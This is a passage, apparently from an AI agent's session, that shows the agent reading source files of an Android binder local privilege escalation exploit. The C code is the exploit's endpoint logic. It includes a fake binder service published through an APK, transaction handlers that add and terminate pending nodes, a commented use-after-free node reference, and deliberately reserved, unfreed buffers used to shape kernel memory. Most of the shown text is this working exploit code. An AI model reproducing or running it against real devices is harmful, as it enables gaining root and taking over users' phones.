			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;

			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffer(bs, handle->reserved_buffer);
				handle->reserved_buffer = 0;
			}
			res = 0;
			break;
		case TRIGGER_DECREF:
			res = 0;
			break;
		default:
			log_err("[-] Unknown transaction code.\n");
			break;
	}


	return res;

}

static struct endpoint_handle *_lookup_by_name(const char *name)
{
	struct endpoint_handle *handle = endpoints;

	while (handle) {
		if (!strcmp(name, handle->name))
				return handle;
		handle = handle->next;


[assistant • bash]
{"command":"cd EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src && sed -n \"$(grep -n 'endpoint_thread' endpoint.c | head -1 | cut -d: -f1),+120p\" endpoint.c"}

[tool • bash]
static void *endpoint_thread(void *args)
{
	uint8_t data[128];
	uint32_t remaining = 0;
	uint32_t consumed = 0;
	struct endpoint_handle *handle = (struct endpoint_handle *)args;


	setjmp(handle->env);

	signal(SIGTERM, plop);

	handle->bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!handle->bs) {
		log_err("[-] Failed to open binder device.\n");
		goto error;
	}

	/* Publish our endpoint name using the fake system server of our APK. */
	if (!publish_handle(handle->bs, 0x42, handle->name)) {
		log_err("[-] Failed to publish handle\n");
		goto error;
	}

	/* Enter looper. */
	uint32_t looper = BC_ENTER_LOOPER;
	binder_write(handle->bs, &looper, sizeof(looper));

	/* Everything's fine. */
	handle->status = 1;
	pthread_barrier_wait(&handle->barrier);

	/* We do this "manually" and don't rely to much on the binder api because
	 * we do some weird things.
	 */
	uint32_t cmd;
	struct binder_transaction_data *tr;


	while ((cmd = binder_read_next(handle->bs, data, &remaining, &consumed))) {
		switch (cmd) {
			case BR_DECREFS:
				break;
			case BR_TRANSACTION: {
				uint8_t rdata[256];
				struct binder_io msg;
				struct binder_io reply;
				int res;

				tr = (struct binder_transaction_data *)(data + consumed - sizeof(*tr));
				bio_init(&reply, rdata, sizeof(rdata), 4);
				bio_init_from_txn(&msg, tr);
				res = endpoint_transaction_handler(handle, tr, &msg, &reply);
				if (tr->flags & TF_ONE_WAY) {
					if (res == 42)
						continue;
					binder_free_buffer(handle->bs, tr->data.ptr.buffer);
				} else {
					if (res == 42)
						/* we reply, but skip freing the buffer. */
						binder_send_reply(handle->bs, &reply, NULL, 0);
					else
						binder_send_reply(handle->bs, &reply, tr->data.ptr.buffer, 0);
				}	
				break;
		        }
			default:
				break;
		}
	}


	exit(0);
error:
	handle->status = -1;
	pthread_barrier_wait(&handle->barrier);
	exit(0);
}



void endpoint_reset(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;

	/* Double check that the name doesn't already exists. */
	if ((handle = _lookup_by_name(endpoint_name)) == NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return;
	}

   /* Reset the endpoint. */
	kill(handle->pid, SIGTERM);

	/* Wait on barrier. */
	pthread_barrier_wait(&handle->barrier);
}

static void endpoint_handle_free(struct endpoint_handle *handle)
{
	struct endpoint_handle *tmp = endpoints;


	/* Start by removing from linked list. */
	if (handle == endpoints) {
		endpoints = handle->next;
	} else {
		while (tmp->next != handle)
			tmp = tmp->next;
		/* Remove */
		tmp->next = handle->next;
	}

	free(handle->name);
	free(handle->stack);
	binder_close(handle->bs);
	free(handle);
}

/*
 * Bootstrap the binder endpoint.
